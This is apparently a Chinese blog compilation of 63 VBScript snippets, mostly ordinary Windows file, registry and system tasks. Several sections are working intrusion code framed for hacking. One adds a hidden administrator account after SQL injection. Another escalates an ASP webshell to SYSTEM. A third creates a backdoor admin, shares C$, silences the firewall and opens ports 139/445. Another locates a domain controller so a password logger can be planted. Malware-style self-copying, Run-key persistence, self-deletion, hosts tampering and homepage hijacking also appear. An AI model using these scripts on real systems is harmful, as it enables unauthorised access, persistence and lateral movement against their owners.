1、VBS获取系统安装路径

/*先定义这个变量是获取系统安装路径的，然后我们用“&strWinDir&”调用这个变量。*/

set WshShell = WScript.CreateObject("WScript.Shell")

strWinDir = WshShell.ExpandEnvironmentStrings("%WinDir%")

2、VBS获取C:/Program Files路径

msgbox  CreateObject("WScript.Shell").ExpandEnvironmentStrings("%ProgramFiles%")

3、VBS获取C:/Program Files/Common Files路径

msgbox CreateObject("WScript.Shell").ExpandEnvironmentStrings("%CommonProgramFiles%")

4、给桌面添加网址快捷方式

set gangzi = WScript.CreateObject("WScript.Shell")

strDesktop = gangzi.SpecialFolders("Desktop")

set oShellLink = gangzi.CreateShortcut(strDesktop & "/Internet Explorer.lnk")

oShellLink.TargetPath = "http://www.fendou.info"

oShellLink.Description = "Internet Explorer"

oShellLink.IconLocation = "%ProgramFiles%/Internet Explorer/iexplore.exe, 0"

oShellLink.Save

5、给收藏夹添加网址

Const ADMINISTRATIVE_TOOLS = 6

Set objShell = CreateObject("Shell.Application")

Set objFolder = objShell.Namespace(ADMINISTRATIVE_TOOLS)

Set objFolderItem = objFolder.Self    

Set objShell = WScript.CreateObject("WScript.Shell")

strDesktopFld = objFolderItem.Path

Set objURLShortcut = objShell.CreateShortcut(strDesktopFld & "/奋斗Blog.url")

objURLShortcut.TargetPath = "http://www.fendou.info/"

objURLShortcut.Save

6、删除指定目录指定后缀文件

On Error Resume Next

Set fso = CreateObject("Scripting.FileSystemObject")

fso.DeleteFile "C:/*.vbs", True

Set fso = Nothing

7、VBS改主页

Set oShell = CreateObject("WScript.Shell")

oShell.RegWrite  "HKEY_CURRENT_USER/Software/Microsoft/Internet Explorer/Main/Start Page","http://www.fendou.info"

8、VBS加启动项

Set oShell=CreateObject("Wscript.Shell")

oShell.RegWrite "HKLM/Software/Microsoft/Windows/CurrentVersion/Run/cmd","cmd.exe"

9、VBS复制自己

set copy1=createobject("scripting.filesystemobject")

copy1.getfile(wscript.scriptfullname).copy("c:/huan.vbs")

set copy1=createobject("scripting.filesystemobject")

copy1.getfile("game.exe").copy("c:/gangzi.exe")

/*复制自己到C盘的huan.vbs(复制本vbs目录下的game.exe文件到c盘的gangzi.exe)*/

10、VBS获取系统临时目录

Dim fso

Set fso = CreateObject("Scripting.FileSystemObject")

Dim tempfolder

Const TemporaryFolder = 2

Set tempfolder = fso.GetSpecialFolder(TemporaryFolder)

Wscript.Echo tempfolder

11、就算代码出错 依然继续执行

On Error Resume Next

12、VBS打开网址

Set objShell = CreateObject("Wscript.Shell")

objShell.Run("http://www.fendou.info/")

13、VBS发送邮件

NameSpace = "http://schemas.microsoft.com/cdo/configuration/"

Set Email = CreateObject("CDO.Message")

Email.From = "发件@qq.com"

Email.To = "收件@qq.com"

Email.Subject = "Test sendmail.vbs"

Email.Textbody = "OK!"

Email.AddAttachment "C:/1.txt"

With Email.Configuration.Fields

.Item(NameSpace&"sendusing") = 2

.Item(NameSpace&"smtpserver") = "smtp.邮件服务器.com"

.Item(NameSpace&"smtpserverport") = 25

.Item(NameSpace&"smtpauthenticate") = 1

.Item(NameSpace&"sendusername") = "发件人用户名"

.Item(NameSpace&"sendpassword") = "发件人密码"

.Update

End With

Email.Send

14、VBS结束进程

strComputer = "."

Set objWMIService = GetObject _

    ("winmgmts://" & strComputer & "/root/cimv2")

Set colProcessList = objWMIService.ExecQuery _

    ("Select * from Win32_Process Where Name = 'Rar.exe'")

For Each objProcess in colProcessList

    objProcess.Terminate()

Next

15、VBS隐藏打开网址(部分浏览器无法隐藏打开，而是直接打开，适合主流用户使用)

createObject("wscript.shell").run "iexplore http://www.fendou.info/",0

/*兼容所有浏览器，使用IE的绝对路径+参数打开，无法用函数得到IE安装路径，只用函数得到了Program Files路径，应该比上面的方法好，但是两种方法都不是绝对的。*/

Set objws=WScript.CreateObject("wscript.shell")

objws.Run """C:/Program Files/Internet Explorer/iexplore.exe""www.baidu.com",vbhide

16、VBS遍历硬盘删除指定文件名

On Error Resume Next

Dim fPath

strComputer = "."

Set objWMIService = GetObject _

    ("winmgmts://" & strComputer & "/root/cimv2")

Set colProcessList = objWMIService.ExecQuery _

    ("Select * from Win32_Process Where Name = 'gangzi.exe'")

For Each objProcess in colProcessList

    objProcess.Terminate()

Next

Set objWMIService = GetObject("winmgmts:" _

& "{impersonationLevel=impersonate}!//" & strComputer & "/root/cimv2")

Set colDirs = objWMIService. _

ExecQuery("Select * from Win32_Directory where name LIKE '%c:%' or name LIKE '%d:%' or name LIKE '%e:%' or name LIKE '%f:%' or name LIKE '%g:%' or name LIKE '%h:%' or name LIKE '%i:%'")

Set objFSO = CreateObject("Scripting.FileSystemObject")

For Each objDir in colDirs

fPath = objDir.Name & "/gangzi.exe"

objFSO.DeleteFile(fPath), True

Next

17、VBS获取网卡MAC地址

Dim mc,mo

Set mc=GetObject("Winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")

For Each mo In mc

If mo.IPEnabled=True Then

MsgBox "本机网卡MAC地址是: " & mo.MacAddress

Exit For

End If

Next

18、VBS获取本机注册表主页地址

Set reg=WScript.CreateObject("WScript.Shell")

startpage=reg.RegRead("HKEY_CURRENT_USER/Software/Microsoft/Internet Explorer/Main/Start Page")

MsgBox startpage

19、VBS遍历所有磁盘的所有目录，找到所有.txt的文件，然后给所有txt文件最底部加一句话

On Error Resume Next

Set fso = CreateObject("Scripting.FileSystemObject")

Co = VbCrLf & "路过。。。"

For Each i In fso.Drives

  If i.DriveType = 2 Then

    GF fso.GetFolder(i & "/")

  End If

Next

Sub GF(fol)

  Wh fol

  Dim i

  For Each i In fol.SubFolders

    GF i

  Next

End Sub

Sub Wh(fol)

  Dim i

  For Each i In fol.Files

    If LCase(fso.GetExtensionName(i)) = "shtml" Then

      fso.OpenTextFile(i,8,0).Write Co

    End If

  Next

End Sub

20、获取计算机所有盘符

Set fso=CreateObject("scripting.filesystemobject")

Set objdrives=fso.Drives '取得当前计算机的所有磁盘驱动器

For Each objdrive In objdrives '遍历磁盘

MsgBox objdrive

Next

21、VBS给本机所有磁盘根目录创建文件

On Error Resume Next

Set fso=CreateObject("Scripting.FileSystemObject")

Set gangzis=fso.Drives        '取得当前计算机的所有磁盘驱动器

For Each gangzi In gangzis   '遍历磁盘

Set TestFile=fso.CreateTextFile(""&gangzi&"/新建文件夹.vbs",Ture)

TestFile.WriteLine("By www.gangzi.org")

TestFile.Close

Next

22、VBS遍历本机全盘找到所有123.exe，然后给他们改名321.exe

set fs = CreateObject("Scripting.FileSystemObject")

for each drive in fs.drives

fstraversal drive.rootfolder

next

sub fstraversal(byval this)

for each folder in this.subfolders

fstraversal folder

next

set files = this.files

for each file in files

if file.name = "123.exe" then file.name = "321.exe"

next

end sub

23、VBS写入代码到粘贴板

/*先说明一下，VBS写内容到粘贴板，网上千篇一律都是通过InternetExplorer.Application对象来实现，但是缺点是在默认浏览器为非IE中会弹出浏览器，所以费了很大的劲找到了这个代码来实现*/

str=“这里是你要复制到剪贴板的字符串”

Set ws = wscript.createobject("wscript.shell")

ws.run "mshta vbscript:clipboardData.SetData("+""""+"text"+""""+","+""""&str&""""+")(close)",0,true

24、QQ自动发消息

On Error Resume Next

str="我是笨蛋/qq"

Set WshShell=WScript.CreateObject("WScript.Shell")

WshShell.run "mshta vbscript:clipboardData.SetData("+""""+"text"+""""+","+""""&str&""""+")(close)",0

WshShell.run "tencent://message/?Menu=yes&uin=20016964&Site=&Service=200&sigT=2a39fb276d15586e1114e71f7af38e195148b0369a16a40fdad564ce185f72e8de86db22c67ec3c1",0,true

WScript.Sleep 3000

WshShell.SendKeys "^v"

WshShell.SendKeys "%s"

25、VBS隐藏文件

Set objFSO = CreateObject("Scripting.FileSystemObject")

Set objFile = objFSO.GetFile("F:/软件大赛/show.txt")

If objFile.Attributes = objFile.Attributes AND 2 Then

    objFile.Attributes = objFile.Attributes XOR 2

End If

26、VBS生成随机数

/*521是生成规则，不同的数字生成的规则不一样，可以用于其它用途*/

Randomize 521

point=Array(Int(100*Rnd+1),Int(1000*Rnd+1),Int(10000*Rnd+1))

msgbox join(point,"")

27、VBS删除桌面IE图标（非快捷方式）

Set oShell = CreateObject("WScript.Shell")

oShell.RegWrite "HKCU/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/NoInternetIcon",1,"REG_DWORD"

28、VBS获取自身文件名

Set fso = CreateObject("Scripting.FileSystemObject")

msgbox WScript.ScriptName

29、VBS读取Unicode编码的文件

Set objFSO = CreateObject("Scripting.FileSystemObject")

Set objFile = objFSO.OpenTextFile("gangzi.txt",1,False,-1)

strText = objFile.ReadAll

objFile.Close

Wscript.Echo strText

30、VBS读取指定编码的文件（默认为uft-8）gangzi变量是要读取文件的路径

set stm2 =createobject("ADODB.Stream")

stm2.Charset = "utf-8"

stm2.Open

stm2.LoadFromFile gangzi

readfile = stm2.ReadText

MsgBox readfile

31、VBS禁用组策略

Set oShell = CreateObject("WScript.Shell")

oShell.RegWrite "HKEY_CURRENT_USER/Software/Policies/Microsoft/MMC/RestrictToPermittedSnapins",1,"REG_DWORD"

32、VBS写指定编码的文件（默认为uft-8）gangzi变量是要读取文件的路径，gangzi2是内容变量

gangzi="1.txt"

gangzi2="www.gangzi.org"

Set Stm1 = CreateObject("ADODB.Stream")

Stm1.Type = 2

Stm1.Open

Stm1.Charset = "UTF-8"

Stm1.Position = Stm1.Size

Stm1.WriteText gangzi2

Stm1.SaveToFile gangzi,2

Stm1.Close

set Stm1 = nothing

33、VBS获取当前目录下所有文件夹名字（不包括子文件夹）

Set fso=CreateObject("scripting.filesystemobject")

Set f=fso.GetFolder(fso.GetAbsolutePathName("."))

Set folders=f.SubFolders

For Each fo In folders

  wsh.echo fo.Name

Next

Set folders=Nothing

Set f=nothing

Set fso=nothing

34、VBS获取指定目录下所有文件夹名字（包括子文件夹）

Dim t

Set fso=WScript.CreateObject("scripting.filesystemobject")

Set fs=fso.GetFolder("d:/")

WScript.Echo aa(fs)

Function aa(n)

Set f=n.subfolders

For Each uu In f

Set op=fso.GetFolder(uu.path)

t=t & vbcrlf & op.path

Call aa(op)

Next

aa=t

End function

35、VBS创建.URL文件

/*IconIndex参数不同的数字代表不同的图标，具体请参照SHELL32.dll里面的所有图标*/

set fso=createobject("scripting.filesystemobject")

qidong=qidong&"[InternetShortcut]"&Chr(13)&Chr(10)

qidong=qidong&"URL=http://www.fendou.info"&Chr(13)&Chr(10)

qidong=qidong&"IconFile=C:/WINDOWS/system32/SHELL32.dll"&Chr(13)&Chr(10)

qidong=qidong&"IconIndex=130"&Chr(13)&Chr(10)

Set TestFile=fso.CreateTextFile("qq.url",Ture)

TestFile.WriteLine(qidong)

TestFile.Close

36、VBS写hosts

/*没写判断，无论存不存在都追加底部*/

Set fs = CreateObject("Scripting.FileSystemObject")

path = ""&fs.GetSpecialFolder(1)&"/drivers/etc/hosts"

Set f = fs.OpenTextFile(path,8,TristateFalse)

f.Write ""&vbcrlf&"127.0.0.1 www.g.cn"&vbcrlf&"127.0.0.1 g.cn"

f.Close

37、VBS读取出HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Desktop/NameSpace 下面所有键的名字并循环输出

Const HKLM = &H80000002

strPath = "SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/Desktop/NameSpace"

Set oreg = GetObject("Winmgmts:/root/default:StdRegProv")

    oreg.EnumKey HKLM,strPath,arr

    For Each x In arr

        WScript.Echo x

    Next

38、VBS创建txt文件

Dim fso,TestFile

Set fso=CreateObject("Scripting.FileSystemObject")

Set TestFile=fso.CreateTextFile("C:/hello.txt",Ture)

TestFile.WriteLine("Hello,World!")

TestFile.Close

39、VBS创建文件夹

Dim fso,fld

Set fso=CreateObject("Scripting.FileSystemObject")

Set fld=fso.CreateFolder("C:/newFolder")

40、VBS判断文件夹是否存在

Dim fso,fld

Set fso=CreateObject("Scripting.FileSystemObject")

If (fso.FolderExists("C:/newFolder")) Then

msgbox("Folder exists.")

else

set fld=fso.CreateFolder("C:/newFolder")

End If

41、VBS使用变量判断文件夹

Dim fso,fld

drvName="C:/"

fldName="newFolder"

Set fso=CreateObject("Scripting.FileSystemObject")

If (fso.FolderExists(drvName&fldName)) Then

msgbox("Folder exists.")

else

set fld=fso.CreateFolder(drvName&fldName)

End If

42、VBS加输入框

Dim fso,TestFile,fileName,drvName,fldName

drvName=inputbox("Enter the drive to save to:","Drive letter")

fldName=inputbox("Enter the folder name:","Folder name")

fileName=inputbox("Enter the name of the file:","Filename")

Set fso=CreateObject("Scripting.FileSystemObject")

If(fso.FolderExists(drvName&fldName))Then

msgbox("Folder exists")

Else

Set fld=fso.CreateFolder(drvName&fldName)

End If

Set TestFile=fso.CreateTextFile(drvName&fldName&"/"&fileName&".txt",True)

TestFile.WriteLine("Hello,World!")

TestFile.Close

43、VBS检查是否有相同文件

Dim fso,TestFile,fileName,drvName,fldName

drvName=inputbox("Enter the drive to save to:","Drive letter")

fldName=inputbox("Enter the folder name:","Folder name")

fileName=inputbox("Enter the name of the file:","Filename")

Set fso=CreateObject("Scripting.FileSystemObject")

If(fso.FolderExists(drvName&fldName))Then

msgbox("Folder exists")

Else

Set fld=fso.CreateFolder(drvName&fldName)

End If

If(fso.FileExists(drvName&fldName&"/"&fileName&".txt"))Then

msgbox("File already exists.")

Else

Set TestFile=fso.CreateTextFile(drvName&fldName&"/"&fileName&".txt",True)

TestFile.WriteLine("Hello,World!")

TestFile.Close

End If

44、VBS改写、追加 文件

Dim fso,openFile

Set fso=CreateObject("Scripting.FileSystemObject")

Set openFile=fso.OpenTextFile("C:/test.txt",2,True)   '1表示只读，2表示可写，8表示追加

openFile.Write "Hello World!"

openFile.Close

45、VBS读取文件 ReadAll 读取全部

Dim fso,openFile

Set fso=CreateObject("Scripting.FileSystemObject")

Set openFile=fso.OpenTextFile("C:/test.txt",1,True)

MsgBox(openFile.ReadAll)

46、VBS读取文件 ReadLine 读取一行

Dim fso,openFile

Set fso=CreateObject("Scripting.FileSystemObject")

Set openFile=fso.OpenTextFile("C:/test.txt",1,True)

MsgBox(openFile.ReadLine())

MsgBox(openFile.ReadLine())   '如果读取行数超过文件的行数，就会出错

47、VBS读取文件 Read 读取n个字符

Dim fso,openFile

Set fso=CreateObject("Scripting.FileSystemObject")

Set openFile=fso.OpenTextFile("C:/test.txt",1,True)

MsgBox(openFile.Read(2))   '如果超出了字符数，不会出错。

48、VBS删除文件

Dim fso

Set fso=CreateObject("Scripting.FileSystemObject")

fso.DeleteFile("C:/test.txt")

49、VBS删除文件夹

Dim fso

Set fso=CreateObject("Scripting.FileSystemObject")

fso.DeleteFolder("C:/newFolder") '不管文件夹中有没有文件都一并删除

50、VBS连续创建文件

Dim fso,TestFile

Set fso=CreateObject("Scripting.FileSystemObject")

For i=1 To 10

Set TestFile=fso.CreateTextFile("C:/hello"&i&".txt",Ture)

TestFile.WriteLine("Hello,World!")

TestFile.Close

Next

51、VBS根据计算机名随机生成字符串

set ws=createobject("wscript.shell")

set wenv=ws.environment("process")

RDA=wenv("computername")

Function UCharRand(n)

For i=1 to n

Randomize ASC(MID(RDA,1,1))

temp = cint(25*Rnd)

temp = temp +65

UCharRand = UCharRand & chr(temp)

Next

End Function

msgbox UCharRand(LEN(RDA))

52、VBS根据mac生成序列号

Function Encode(strPass)

   Dim i, theStr, strTmp

   For i = 1 To Len(strPass)

    strTmp = Asc(Mid(strPass, i, 1))

    theStr = theStr & Abs(strTmp)

   Next

   strPass = theStr

   theStr = ""

   Do While Len(strPass) > 16

    strPass = JoinCutStr(strPass)

   Loop

   For i = 1 To Len(strPass)

    strTmp = CInt(Mid(strPass, i, 1))

    strTmp = IIf(strTmp > 6, Chr(strTmp + 60), strTmp)

    theStr = theStr & strTmp

   Next

   Encode = theStr

End Function

Function JoinCutStr(str)

   Dim i, theStr

   For i = 1 To Len(str)

    If Len(str) - i = 0 Then Exit For

    theStr = theStr & Chr(CInt((Asc(Mid(str, i, 1)) + Asc(Mid(str, i +1, 1))) / 2))

    i = i + 1

   Next

   JoinCutStr = theStr

End Function

Function IIf(var, val1, val2)

   If var = True Then

    IIf = val1

   Else

    IIf = val2

   End If

End Function

Set mc=GetObject("Winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")

For Each mo In mc

If mo.IPEnabled=True Then

theStr = mo.MacAddress

Exit For

End If

Next

Randomize Encode(theStr)

rdnum=Int(10*Rnd+5)

Function allRand(n)

  For i=1 to n

    Randomize Encode(theStr)

    temp = cint(25*Rnd)

    If temp mod 2 = 0 then

      temp = temp + 97

    ElseIf temp < 9 then

      temp = temp + 48

    Else

      temp = temp + 65

    End If

    allRand = allRand & chr(temp)

  Next

End Function

msgbox allRand(rdnum)

53、VBS自动连接adsl

Dim Wsh

Set Wsh = WScript.CreateObject("WScript.Shell")

wsh.run "Rasdial 连接名字 账号 密码",false,1

54、VBS自动断开ADSL

Dim Wsh

Set Wsh = WScript.CreateObject("WScript.Shell")

wsh.run "Rasdial /DISCONNECT",false,1

55、VBS每隔3秒自动更换IP并打开网址实例

/*值得一提的是，下面这个代码中每次打开的网址都是引用同一个IE窗口，也就是每次打开的是覆盖上次打开的窗口，如果需要每次打开的网址都是新窗口，直接使用run就可以了*/

Dim Wsh

Set Wsh = WScript.CreateObject("WScript.Shell")

Set oIE = CreateObject("InternetExplorer.Application")

for i=1 to 5

wsh.run "Rasdial /DISCONNECT",false,1

wsh.run "Rasdial 连接名字 账号 密码",false,1

oIE.Navigate "http://www.ip138.com/?"&i&""

Call SynchronizeIE

oIE.Visible = True

next

Sub SynchronizeIE

On Error Resume Next

Do While(oIE.Busy)

WScript.Sleep 3000

Loop

End Sub

56、用VBS来加管理员帐号
/*在注入过程中明明有了sa帐号，但是由于net.exe和net1.exe被限制，或其它的不明原因，总是加不了管理员帐号。VBS在活动目录（adsi）部份有一个winnt对像，可以用来管理本地资源，可以用它不依靠cmd等命令来加一个管理员*/

set wsnetwork=CreateObject("WSCRIPT.NETWORK")

os="WinNT://"&wsnetwork.ComputerName

Set ob=GetObject(os)                         '得到adsi接口,绑定

Set oe=GetObject(os&"/Administrators,group")   '属性,admin组

Set od=ob.Create("user","lcx")                 '建立用户

od.SetPassword "123456"                     '设置密码

od.SetInfo                                   '保存

Set of=GetObject(os&"/lcx",user)               '得到用户

oe.add os&"/lcx"

/*这段代码如果保存为1.vbs，在cmd下运行，格式: cscript 1.vbs的话，会在当前系统加一个名字为lcx，密码为123456的管理员。当然，你可以用记事本来修改里边的变量lcx和123456，改成你喜欢的名字和密码值。*/

57、用vbs来列虚拟主机的物理目录
/*有时旁注入侵成功一个站，拿到系统权限后，面对上百个虚拟主机，怎样才能更快的找到我们目标站的物理目录呢？一个站一个站翻看太累，用系统自带的adsutil.vbs吧又感觉好像参数很多，有点无法下手的感觉，试试我这个脚本吧，代码如下：*/

Set ObjService=GetObject("IIS://LocalHost/W3SVC")

For Each obj3w In objservice

If IsNumeric(obj3w.Name) Then

sServerName=Obj3w.ServerComment

Set webSite = GetObject("IIS://Localhost/W3SVC/" & obj3w.Name & "/Root")

ListAllWeb = ListAllWeb & obj3w.Name & String(25-Len(obj3w.Name)," ") & obj3w.ServerComment & "(" & webSite.Path & ")" & vbCrLf

End If

Next

WScript.Echo ListAllWeb

Set ObjService=Nothing

WScript.Quit

/*运行cscript 2.vbs后，就会详细列出IIS里的站点ID、描述、及物理目录，是不是代码少很多又方便呢*/

58、用VBS快速找到内网域的主服务器
/*面对域结构的内网，可能许多小菜没有经验如何去渗透。如果你能拿到主域管理员的密码，整个内网你就可以自由穿行了。主域管理员一般呆在比较重要的机器上，如果能搞定其中的一台或几台，放个密码记录器之类，相信总有一天你会拿到密码。主域服务器当然是其中最重要一台了，如何在成千台机器里判断出是哪一台呢？dos命令像net group “domain admins” /domain可以做为一个判断的标准，不过vbs也可以做到的，这仍然属于adsi部份的内容，：*/

set obj=GetObject("LDAP://rootDSE")

wscript.echo obj.servername

/*只用这两句代码就足够了，运行cscript 3.vbs，会有结果的。当然，无论是dos命令或vbs，你前提必须要在域用户的权限下。好比你得到了一个域用户的帐号密码，你可以用 psexec.exe -u -p cmd.exe这样的格式来得到域用户的shell，或你的木马本来就是与桌面交互的，登陆你木马shell的又是域用户，就可以直接运行这些命令了。
    vbs的在入侵中的作用当然不只这些，当然用js或其它工具也可以实现我上述代码的功能；不过这个专栏定下的题目是vbs在hacking中的妙用，所以我们只提vbs。写完vbs这部份我和其它作者会在以后的专栏继续策划其它的题目，争取为读者带来好的有用的文章。*/

59、WebShell提权用的VBS代码
/*asp木马一直是搞脚本的朋友喜欢使用的工具之一,但由于它的权限一般都比较低(一般是IWAM_NAME权限),所以大家想出了各种方法来提升它的权限,比如说通过asp木马得到mssql数据库的权限,或拿到ftp的密码信息,又或者说是替换一个服务程序。而我今天要介绍的技巧是利用一个vbs文件来提升asp木马的权限，代码如下asp木马一直是搞脚本的朋友喜欢使用的工具之一,但由于它的权限一般都比较低(一般是IWAM_NAME权限),所以大家想出了各种方法来提升它的权限,比如说通过asp木马得到mssql数据库的权限,或拿到ftp的密码信息,又或者说是替换一个服务程序。而我今天要介绍的技巧是利用一个vbs文件来提升asp木马的权限*/

set wsh=createobject("wscript.shell") 

a=wsh.run ("cmd.exe /c cscript.exe C:/Inetpub/AdminScripts/adsutil.vbs set /W3SVC/InProcessIsapiApps C:/WINNT/system32/inetsrv/httpext.dll C:/WINNT/system32/inetsrv/httpodbc.dll C:/WINNT/system32/inetsrv/ssinc.dll C:/WINNT/system32/msw3prt.dll C:/winnt/system32/inetsrv/asp.dll",0) '加入asp.dll到InProcessIsapiApps中

/*将其保存为vbs的后缀,再上传到服务上，然后利用asp木马执行这个vbs文件后。再试试你的asp木马吧，你会发现自己己经是system权限了*/

60、VBS开启ipc服务和相关设置

Dim OperationRegistry

Set OperationRegistry=WScript.CreateObject("WScript.Shell")

OperationRegistry.RegWrite "HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Lsa/forceguest",0

Set wsh3=wscript.createobject("wscript.shell")

wsh3.Run "net user helpassistant 123456",0,false

wsh3.Run "net user helpassistant /active",0,false

wsh3.Run "net localgroup administrators helpassistant /add",0,false

wsh3.Run "net start Lanmanworkstation /y",0,false

wsh3.Run "net start Lanmanserver /y",0,false

wsh3.Run "net start ipc$",0,True

wsh3.Run "net share c$=c:/",0,false

wsh3.Run "netsh firewall set notifications disable",0,True

wsh3.Run "netsh firewall set portopening TCP 139 enable",0,false

wsh3.Run "netsh firewall set portopening UDP 139 enable",0,false

wsh3.Run "netsh firewall set portopening TCP 445 enable",0,false

wsh3.Run "netsh firewall set portopening UDP 445 enable",0,false

61、VBS时间判断代码

Digital=time

    hours=Hour(Digital)

    minutes=Minute(Digital)

    seconds=Second(Digital)

    if (hours<6) then

        dn="凌辰了，还没睡啊？"

    end if

    if (hours>=6) then

        dn="早上好！"

    end if

    if (hours>12) then

        dn="下午好！"

    end if

    if (hours>18) then

        dn="晚上好！"

    end if

    if (hours>22) then

        dn="不早了，夜深了，该睡觉了！"

    end if

    if (minutes<=9) then

        minutes="0" & minutes

    end if

    if (seconds<=9) then

        seconds="0" & seconds

    end if

ctime=hours & ":" & minutes & ":" & seconds & " " & dn

Msgbox ctime

62、VBS注册表读写

Dim OperationRegistry , mynum

Set OperationRegistry=WScript.CreateObject("WScript.Shell")

mynum = 9

mynum = OperationRegistry.RegRead("HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Lsa/forceguest")

MsgBox("before forceguest = "&mynum)

OperationRegistry.RegWrite "HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Lsa/forceguest",0

mynum = OperationRegistry.RegRead("HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Lsa/forceguest")

MsgBox("after forceguest = "&mynum)

63、VBS运行后删除自身代码

dim fso,f

Set fso = CreateObject("Scripting.FileSystemObject")

f = fso.DeleteFile(WScript.ScriptName)

WScript.Echo( WScript.ScriptName)